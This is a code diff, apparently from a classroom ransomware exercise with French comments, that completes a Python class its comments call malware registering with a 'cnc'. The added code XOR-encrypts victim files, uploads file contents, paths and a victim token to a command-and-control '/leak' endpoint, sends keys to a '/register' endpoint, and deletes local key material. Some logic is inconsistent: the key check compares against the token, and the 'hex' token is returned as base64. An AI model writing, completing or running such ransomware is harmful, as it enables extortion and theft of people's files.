@@ -28,95 +28,132 @@ class SecretManager:
         self._log = logging.getLogger(self.__class__.__name__)
 
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        # Derive a key from a salt and key using PBKDF2HMAC
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=self.KEY_LENGTH,
             salt=salt,
             iterations=self.ITERATION,
+            
         )
         return kdf.derive(key)
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
-         # Generate random salt, key, and token
-        salt = os.urandom(self.SALT_LENGTH)
-        key = secrets.token_bytes(self.KEY_LENGTH)
-        token = secrets.token_bytes(self.TOKEN_LENGTH)
-
-        # Derive the final key from the salt and key using PBKDF2HMAC
-        final_key = self.do_derivation(salt, key)
-
-        return salt, final_key, token
+        self._salt = os.urandom(self.SALT_LENGTH)
+        self._key = secrets.token_bytes(self.KEY_LENGTH)
+        self._token = os.urandom(self.TOKEN_LENGTH)
+        return self._salt, self._key, self._token
 
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
-
-    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        url = f"http://{self._remote_host_port}/new"
+    
+    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
+        # Création de l'URL de destination
+        # Et encodage des données
         data = {
             "salt": self.bin_to_b64(salt),
             "key": self.bin_to_b64(key),
             "token": self.bin_to_b64(token),
         }
-        res = requests.post(url, json=data)
-        res.raise_for_status()
-        
-    def setup(self)->None:
-        if not os.path.exists(self._path):
-            os.makedirs(self._path)
-        # main function to create crypto data and register malware to cnc
-        # Create crypto data and register malware to CNC
-        salt, key, token = self.create()
-        self.post_new(salt, key, token)
-
-        # Save the crypto data to the target
-        with open(os.path.join(self._path, "salt"), "wb") as f:
-            f.write(salt)
-        with open(os.path.join(self._path, "key"), "wb") as f:
-            f.write(key)
-        with open(os.path.join(self._path, "token"), "wb") as f:
-            f.write(token)
-
-    def load(self)->None:
-        # function to load crypto data
-        with open(os.path.join(self._path, "salt"), "rb") as f:
-            self._salt = f.read()
-
-        with open(os.path.join(self._path, "token"), "rb") as f:
-            self._token = f.read()
-
-        with open(os.path.join(self._path, "key"), "rb") as f:
-            self._key = f.read()
+        requests.post(f"http://{self._remote_host_port}/register", json=data)
 
 
-    def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        return self._key == self.do_derivation(self._salt, candidate_key)
+    def setup(self) -> None:
+       #Fonction permettant de créer des données cryptographiques et enregistrer le malware dans le cnc
+       # Créer les éléments : sel, clé et jeton
+        self.create()
+        self.post_new(self._salt, self._key, self._token)
 
-    def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        key = base64.b64decode(b64_key)
-        if not self.check_key(key):
-            raise ValueError("Invalid key")
 
-        self._key = key
+    def load(self) -> None:
+        # Fonction pour charger les données cryptographiques
+        salt_path = os.path.join(self._path, "salt.bin")
+        token_path = os.path.join(self._path, "token.bin")
 
+        # Vérifie l'existence des fichiers de sel et de token
+        if os.path.exists(salt_path) and os.path.exists(token_path):
+            with open(salt_path, "rb") as salt_f:
+                self._salt = salt_f.read()
+            with open(token_path, "rb") as token_f:
+                self._token = token_f.read()
+            # Affiche un message de confirmation
+            self._log.info("charger les données sel et de token")
+        else:
+            # Affiche un message d'erreur au cas contraire
+            self._log.error("Les fichiers de sel ou de token n'existe pas") 
+
+
+    def check_key(self, candidate_key: bytes) -> bool:
+        # Vérifie si la clé candidate est valide
+        token = self.do_derivation(self._salt, candidate_key)
+
+        # vérifier si la clé est valide
+        if token == self._token:
+            return True
+        else:
+            return False
+
+
+    def set_key(self, b64_key: str) -> None:
+        # Décode la clé en base64 et la teste
+        decoded_key = base64.b64decode(b64_key)
+        if self.check_key(decoded_key):
+            self._key = decoded_key
+            self._log.info("Clé Acceptée")
+        else:
+            self._log.error("Clé Refusée")
+
+
+    
     def get_hex_token(self)->str:
-        # Should return a string composed of hex symbole, regarding the token
-         token_hash = sha256(self._token).hexdigest()
-        return token_hash
+        # Devrait retourner une chaîne de caractères composée de symboles hexadécimaux, en ce qui concerne le token
+        return self.bin_to_b64(self._token)
 
     def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        raise NotImplemented()
+        # Effectuer un XOR sur une liste pour un fichier.
+        for file_path in files:
+            try:
+                xorfile(file_path, self._key)
+            except Exception as e:
+                self._log.error(f"Error encrypting file {file_path}: {e}")
 
     def leak_files(self, files:List[str])->None:
-        # send file, geniune path and token to the CNC
-        raise NotImplemented()
+        # On doit envoyer le fichier, le chemin authentique et le token au cnc
+        url = f"http://{self._remote_host_port}/leak"
+        for file in files:
+            with open(file, "rb") as f:
+                content = f.read()
+            b64_content = self.bin_to_b64(content)
+            data = {
+                "token": self.bin_to_b64(self._token),
+                "path": file,
+                "content": b64_content
+            }
+            response = requests.post(url, json=data)
+            response.raise_for_status()
 
-    def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
+
+    def clean(self) -> None:
+        # Supprimer les fichiers de cryptographie locaux
+        salt_file = os.path.join(self._path, "salt.bin")
+        token_file = os.path.join(self._path, "token.bin")
+
+        try:
+            if os.path.exists(salt_file):
+                os.remove(salt_file)
+                self._log.info("fichier Salt effacé")
+
+            if os.path.exists(token_file):
+                os.remove(token_file)
+                self._log.info("fichier token effacé")
+
+        except Exception as err:
+            self._log.error(f"Erreur lors du 'clean' des fichiers: {err}")
+        finally:
+            # Effacer les données en mémoire
+            self._salt = None
+            self._key = None
+            self._token = None
+
